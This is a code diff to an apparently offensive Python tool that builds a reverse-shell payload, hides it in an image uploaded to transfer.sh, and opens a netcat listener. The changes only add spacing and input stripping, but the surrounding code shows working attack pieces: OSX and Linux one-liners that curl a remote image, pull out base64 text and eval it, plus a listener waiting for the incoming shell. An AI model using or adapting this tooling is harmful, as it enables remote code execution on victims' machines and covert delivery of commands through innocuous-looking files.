@@ -16,19 +16,22 @@ from pyfiglet import Figlet
 def listener():
     """Open a netcat listener"""
 
+    print('\n')
     print(colored("Set up listener? (y/n)", 'red'))
 
     # Asking for valid response
     while True:
-        response = str(input(""))
+        response = str(input("").strip('\n'))
         if not response.isalpha():
             continue
         if response == 'y' or response == 'n':
             break
 
     if response == 'y':
+        print('\n')
         ip = input("Enter ADDRESS to listen on: ")
         port = int(input("Enter PORT to listen on: "))
+        print('\n')
         # open socket listener with nclib
         print(colored("[*] Listening on: " + str(ip) + ":" + str(port), 'red'))
         nc = nclib.Netcat(listen=(ip, port))
@@ -43,6 +46,7 @@ def listener():
 def payload_generator(imageurl):
     """Generate oneliner post exploitation command"""
 
+    print('\n')
     print(colored("[1] -> Generate oneliner for OSX", 'red'))
     print(colored("[2] -> Generate oneliner for LINUX", 'red'))
 
@@ -57,11 +61,13 @@ def payload_generator(imageurl):
     # Generate oneliner for OSX
     if int(system) == 1:
         osxpayload = "p=$(curl -s " + imageurl + " | grep Cert -a | sed 's/<[^>]*>//g' |base64 -d);eval $p"
+        print('\n')
         print(colored("[*] OSX payload generated!", 'red'))
         print(osxpayload)
     # Generate oneliner for LINUX
     elif int(system) == 2:
         nixpayload = "p=$(curl -s " + imageurl + " | grep Cert -a | sed 's/<[^>]*>//g' |base64 -i -d);eval $p"
+        print('\n')
         print(colored("[*] Linux payload generated!", 'red'))
         print(nixpayload)
 
@@ -87,6 +93,7 @@ def uploadimage(file):
     """Upload image to transfer.sh free hosting service"""
 
     url = os.popen("curl -s --upload-file ./" + file + " https://transfer.sh/" + file).read()
+    print('\n')
     print(colored("[*] Image uploaded!", 'red'))
     print(url)
 
@@ -117,7 +124,7 @@ def main():
     # Ask for ip and port
     print(colored("Generate Reverse Shell Payload", 'red'))
     ip = input("Enter IP/HOST: ")
-    port = input("Enter PORT: ")
+    port = input("Enter PORT: ").strip('\n')
 
     # Create image
     filename = createimage()
